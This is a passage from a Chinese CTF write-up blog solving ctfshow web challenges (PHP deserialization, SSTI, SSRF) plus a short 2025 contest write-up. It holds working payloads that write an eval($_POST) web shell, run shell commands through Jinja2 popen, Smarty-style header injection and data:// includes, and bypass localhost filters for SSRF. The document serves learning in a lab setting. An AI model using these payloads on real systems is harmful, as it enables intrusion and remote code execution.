class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>: 2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by: h1xa</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><blockquote><p>构造payload,拿到flag<img src="/img/fx7.jpg" alt="输入图片说明"></p></blockquote><h3 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h3><blockquote><p>这里多了个正则匹配的绕过<br>将全部的O:替换为O:+就可以进行绕过<br>其余和web257相同</p></blockquote><blockquote><p>payload奉上</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@uthor</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>: 2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&#x27;eval($_POST[1]);&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;O:&quot;</span>,<span class="string">&quot;O:+&quot;</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>构造出，然后拿到flag</p></blockquote><h3 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h3><blockquote><p>序列化后是本身就可以输出flag<br>字符串序列化序列化后就是本身<br>因而<br>?ctfshow&#x3D;ctfshow_i_love_36D<br>只要含有ctfshow_i_love_36D就可以，还可以是asidasdhctfshow_i_love_36Dsdcojsdc只要字符转连续不断就可以</p></blockquote><p><img src="/img/fx8.jpg" alt="输入图片说明"></p><h3 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h3><blockquote><p><code>public function __unserialize</code>和<code>public function __wakeup()</code>冲突，当两者均存在时，会自动绕过wakeup魔术方法</p></blockquote><blockquote><p><code>public function __invoke()</code>在这里用不到，相当于没有</p></blockquote><blockquote><p><code>public function __unserialize($data)</code>这个函数的作用是反序列化时将username和password拼接起来，作为code的值</p></blockquote><blockquote><p><code>$this-&gt;code==0x36d</code> 这里是弱相等比较，0x36d转为数字是877,那么由于unserialize魔术方法的拼接，结合下面的<code>file_put_contents($this-&gt;username, $this-&gt;password);</code>写入，只需要username的值为877.php或者877aasd.php等即可绕过，password的值写入一句话木马，就可以rce拿到flag</p></blockquote><blockquote><p> 这里有<code>public function __sleep()</code> sleep魔术方法是再序列化的时候调用的，返回值必须是一个数组，而这里并没有返回值 ，因而在这里没有作用，可以忽略</p></blockquote><blockquote><p>综上,代码奉上<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshowvip</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;877a.php&#x27;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;code==<span class="number">0x36d</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ctfshowvip</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>先写入<img src="/img/fx9.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>再访问写入的877a.php,执行系统命令拿到flag<img src="/img/fx10.jpg" alt="输入图片说明"></p></blockquote><h3 id="web262（经典字符串逃逸）"><a href="#web262（经典字符串逃逸）" class="headerlink" title="web262（经典字符串逃逸）"></a>web262（经典字符串逃逸）</h3><blockquote><p>首先观察题目找到信息<img src="/img/fx11.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>访问后看到题目<img src="/img/fx12.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>看到<code>$umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code>的时候,四个字符串变成五个，很明显的字符串逃逸，要求token的值为admin，就可以拿到flag</p></blockquote><blockquote><p>代码奉上</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>: 2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="keyword">from</span> = <span class="variable">$f</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">message</span>(<span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure><blockquote><p>这里的输出结果要再base64编码一下，得到<br>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MzEwOiJsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVIjtzOjM6Im1zZyI7czoxOiJiIjtzOjI6InRvIjtzOjE6ImMiO3M6NToidG9rZW4iO3M6NToiYWRtaW4iO30iO3M6MzoibXNnIjtzOjE6ImIiO3M6MjoidG8iO3M6MToiYyI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7fQ&#x3D;&#x3D;</p></blockquote><blockquote><p>写入cookie拿到flag<img src="/img/fx13.jpg" alt="输入图片说明"></p></blockquote><h2 id="ssti"><a href="#ssti" class="headerlink" title="ssti"></a>ssti</h2><h3 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h3><blockquote><p>首先我们根据题目提示找到传入的参数为name<br><img src="/img/ct1.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>测试发现是ssti<img src="/img/ct2.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>因为没有任何过滤，直接读就可以<br><code> ?name=&#123;&#123;"".__class__.__base__.__subclasses__()[132].__init__.__globals__['popen']('tac /f*')['read']()&#125;&#125;</code><br><img src="/img/ct3.jpg" alt="输入图片说明"></p></blockquote><h3 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h3><blockquote><p>开始了过滤,这里试了一下，发现过滤了数字2和3</p><p>os的类在132，这里对数字2和3进行绕过就可以，这里使用(dict(e&#x3D;a)|join|count)，e的个数就是数字，可以多个进行加减乘除从而得到想要的数字，使用加法的时候需要进行url编码<br>payload为<code>?name=&#123;&#123;"".__class__.__base__.__subclasses__()[(dict(eeeeeeeeee=a)|join|count)*(dict(eeeeeeeeeeeee=a)|join|count)%2B(dict(ee=a)|join|count)].__init__.__globals__['popen']('tac /f*')['read']()&#125;&#125;</code><br><img src="/img/ct4.jpg" alt="输入图片说明"></p></blockquote><h3 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h3><blockquote><p>测试发现过滤了双引号和单引号<br>“”替换为()<br>这里读到全局变量就可以看到flag<br><code>?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__&#125;&#125;</code><br><img src="/img/ct5.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里也可以使用绕过“”，’的方法<br>使用request.args.a，然后后面再&amp;上想要写的内容就可以<br><img src="/img/ct6.jpg" alt="输入图片说明"><br><code>?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.args.a](request.args.b).read()&#125;&#125;&amp;&amp;a=popen&amp;&amp;b=tac /f*</code></p></blockquote><h3 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h3><blockquote><p>这里过滤了双引号，单引号和args<br>这里使用values来代替args<br>payload为<code>?name=&#123;&#123;().__class__.__base__.__subclasses__()[132].__init__.__globals__[request.values.a](request.values.b).read()&#125;&#125;&amp;a=popen&amp;b=tac /f*</code></p></blockquote><p><img src="/img/ct7.jpg" alt="输入图片说明"></p><h3 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h3><blockquote><p>这里还过滤了[<br>我们使用__getitem__进行绕过就可以，它的作用是使()代替[]<br>payload:<code>?name=&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(132).__init__.__globals__.__getitem__(request.values.x)(request.values.y).read()&#125;&#125;&amp;x=popen&amp;y=tac /f*</code><br>这里还学到一个新的语句，可以不使用[]<br><code>?name=&#123;&#123;url_for.__globals__.os.popen(request.values.c).read()&#125;&#125;&amp;c=tac /f*</code><br>都可以拿到flag</p></blockquote><p><img src="/img/ct8.jpg" alt="输入图片说明"></p><h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><h3 id="web360"><a href="#web360" class="headerlink" title="web360"></a>web360</h3><blockquote><p>根据题目提示为我们要打的是redis，它的开放端口为6379<br>即使不提示也可以通过扫描拿到端口进行尝试<br>这里直接使用gopherus构造payload拿到flag即可<img src="/img/srf0.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>注意在传入的时候_后要进行url二次编码，也就是要再编码一次</p></blockquote><p><img src="/img/srf1.jpg" alt="输入图片说明"></p><blockquote><p>这里默认写入的是shell.php<br>默认是get方式传入cmd<img src="/img/srf2.jpg" alt="输入图片说明"></p></blockquote><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><blockquote><p>这里没有任何过滤,直接访问就可以了</p><p>这里为什么访问的就是flag.php，为什么就不是其他的呢?这里可以通过御剑进行扫描，发现flag.php，所以才访问这个</p></blockquote><p><img src="/img/srf3.jpg" alt="输入图片说明"></p><h3 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h3><blockquote><p>没有密码的mysql，这里直接使用gopherus构造payload<br><img src="/img/srf4.jpg" alt="输入图片说明"></p></blockquote><blockquote><p>这里语句不要由一点差错，不然没办法写入<br>同样的，传入的时候，_后面要进行url二次编码<br><img src="/img/srf5.jpg" alt="输入图片说明"><img src="/img/sr6.jpg" alt="输入图片说明"></p></blockquote><h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><blockquote><p>这里对127.0.0.1进行了过滤，我们将ip转为10进制就可以进行绕过<br><a href="http://127.0.0.1/flag.php![%E8%BE%93%E5%85%A5%E5%9B%BE%E7%89%87%E8%AF%B4%E6%98%8E](/img/srf7.jpg)">http://2130706433/flag.php![输入图片说明](/img/srf7.jpg)</a></p></blockquote><h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><blockquote><p>还可以使用352的方法，为了有所区别，我们使用ip转8进制拿到flag<br><a href="http://127.0.0.1/flag.php">http://017700000001/flag.php</a><br><img src="/img/srf8.jpg" alt="输入图片说明"></p></blockquote><h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><blockquote><p>不能出现0和1，这里使用短网址<br><a href="http://sudo.cc/flag.php">http://sudo.cc/flag.php</a></p></blockquote><p><img src="/img/srf9.jpg" alt="输入图片说明"></p><h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><blockquote><p>这里要求host的长度小于等于5，也就是127.0.0.1处长度不能大于5<br>这里使用127.1代替即可拿到flag<br><img src="/img/srf10.jpg" alt="输入图片说明"></p></blockquote><h3 id="web356"><a href="#web356" class="headerlink" title="web356"></a>web356</h3><blockquote><p>要求长度小于3<br>这里直接使用0代替<br>再linux系统下0代表的就是127.0.0.1<br><a href="http://0.0.0.0/flag.php">http://0/flag.php</a></p></blockquote><p><img src="/img/srf11.jpg" alt="输入图片说明"></p><h3 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h3><blockquote><p>题目意思就是这个</p></blockquote><p><img src="/img/srf12.jpg" alt="输入图片说明"></p><blockquote><p>url&#x3D;<a href="http://ctf.@127.0.0.1/flag.php#show">http://ctf.@127.0.0.1/flag.php#show</a></p></blockquote><blockquote><p>@前面的内容会作为用户解析，不会访问<br>#后面的内容被注释掉了<br>因而实际访问的就是<a href="http://127.0.0.1/flag">http://127.0.0.1/flag</a><br>拿到flag<br><img src="/img/srf13.jpg" alt="输入图片说明"></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2025启航杯wp(部分)</title>
      <link href="/2025/01/26/2025%E5%90%AF%E8%88%AA%E6%9D%AFwp(%E9%83%A8%E5%88%86)/"/>
      <url>/2025/01/26/2025%E5%90%AF%E8%88%AA%E6%9D%AFwp(%E9%83%A8%E5%88%86)/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="2025启航杯"><a href="#2025启航杯" class="headerlink" title="2025启航杯"></a>2025启航杯</h1><h4 id="PvzHE"><a href="#PvzHE" class="headerlink" title="PvzHE"></a>PvzHE</h4><blockquote><p>flag就在文件中的图片里，游戏是植物大战僵尸，居然真的可以玩<br><img src="/img/bei0.jpg" alt="输入图片说明"></p></blockquote><h4 id="QHCTF-For-Year-2025"><a href="#QHCTF-For-Year-2025" class="headerlink" title="QHCTF For Year 2025"></a>QHCTF For Year 2025</h4><p><img src="/img/bei1.jpg" alt="输入图片说明"></p><blockquote><p>第一个下载的文件是10串数字，以-分割，结合日历，每一行的两个数字为一组，在日历上画出来，就是flag<br>QH{FUN}<br><img src="/img/bei2.jpg" alt="输入图片说明"></p></blockquote><h4 id="请找出拍摄地在哪里"><a href="#请找出拍摄地在哪里" class="headerlink" title="请找出拍摄地在哪里"></a>请找出拍摄地在哪里</h4><blockquote><p>根据图片中的洋丰复合肥，柳化复合肥和它上面的4S店广告，可以确定地点是柳城县，再根据高德地图雅迪电动车的位置可以找到图片中的位置,G323国道那个</p></blockquote><h4 id="Easy-include"><a href="#Easy-include" class="headerlink" title="Easy_include"></a>Easy_include</h4><blockquote><p>是一个简单的文件包含，只需要不出现flag.php就可以了，我们考虑使用data伪协议进行绕过，<br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(“tac fla?.php”);<br>再访问网页源代码就可以拿到flag</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);   <span class="comment">//flag in flag.php   </span></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];   </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))   &#123;   </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$file</span>))   </span><br><span class="line">&#123;   <span class="keyword">include</span>(<span class="variable">$file</span>);   </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;   </span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;no no no ~ &quot;</span>);   </span><br><span class="line">&#125;   </span><br><span class="line">&#125;<span class="keyword">else</span>   &#123;   <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);   </span><br><span class="line">&#125;      </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/bei5.jpg" alt="输入图片说明"></p><p><img src="/img/bei4.jpg" alt="输入图片说明"></p><h4 id="Web-IP"><a href="#Web-IP" class="headerlink" title="Web_IP"></a>Web_IP</h4><blockquote><p>这道题和buuctf上的the mystery of ip做法和思路完全一样，这两道题几乎是只改了名称，感兴趣的可以去做做</p></blockquote><blockquote><p>这道题考察的是smart注入，使用BP添加<br><code>X-Forwarded-For：127.0.0.1&#123;&#123;system('ls')&#125;&#125;</code>找到flag.php<br><code>X-Forwarded-For：127.0.0.1&#123;&#123;system('cat /flag')&#125;&#125;</code>打开flag.php文件，得到flag</p></blockquote><!-- }}可能会造成编译解释时出错 --><p><img src="/img/bei3.jpg" alt="输入图片说明"></p><hr><p>首次参加ctf比赛–2025.1.16</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传知识+wp</title>
